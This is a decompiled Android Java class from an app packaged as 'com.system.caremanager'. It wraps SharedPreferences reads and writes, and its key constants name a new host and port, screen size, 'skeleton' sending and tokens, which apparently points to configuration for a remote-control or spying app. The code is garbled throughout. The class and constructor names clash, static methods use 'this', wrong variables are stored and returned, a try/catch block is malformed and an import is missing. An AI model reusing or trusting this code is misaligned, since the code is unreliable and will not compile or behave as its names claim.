package com.system.caremanager;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import java.util.ArrayList;
import java.util.List;

public class SecureSettings {

    public static final String IF_ALREAD_SHOW_HEIPING = "IF_ALREAD_SHOW_HEIPING";
    public static final String NewHost = "NHO";
    public static final String NewPort = "NPO";
    public static final String Newname = "NNA";
    public static final String ScreenHight = "SCW";
    public static final String ScreenWidth = "SCH";
    public static final String SendSkilton = "SKL";
    public static final String Showimto = "SIM";
    public static final String Showmeta = "SME";
    public static final String Showtoke = "STO";
    public static final String Showtrus = "STR";
    public static final String isblocked;
    private static SharedPreferences mSharedPref;

    static {
        // Static initialization block
    }

    public My_Settings() {
        return;
    }

    public static void Write(Context param1, String param2, String param3) {
        String result = this.getPackageName();
        SharedPreferences result2 = this.getSharedPreferences(result, null);
        My_Settings.mSharedPref = result;
        SharedPreferences.Editor result3 = this.edit();
        SharedPreferences.Editor result4 = this.putString(param2, param3);
        boolean result5 = this.commit();
        return;
    }

    public static void WriteBool(Context param1, String param2, Boolean param3) {
        try {
            String result = this.getPackageName();
            SharedPreferences result2 = this.getSharedPreferences(result, null);
            My_Settings.mSharedPref = result;
            SharedPreferences.Editor result3 = this.edit();
            boolean result4 = param3.booleanValue();
            SharedPreferences.Editor result5 = this.putBoolean(param2, result);
            boolean result6 = this.commit();
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static String read(Context param1, String param2, String param3) {
        String result = this.getPackageName();
        SharedPreferences result2 = this.getSharedPreferences(result, null);
        My_Settings.mSharedPref = result;
        String result3 = this.getString(param2, param3);
        return result;
    }

    public static boolean readBool(Context param1, String param2, Boolean param3) {
        String result = this.getPackageName();
        SharedPreferences result2 = this.getSharedPreferences(result, null);
        My_Settings.mSharedPref = result;
        boolean result3 = param3.booleanValue();
        boolean result4 = this.getBoolean(param2, result);
        return result;
    }

}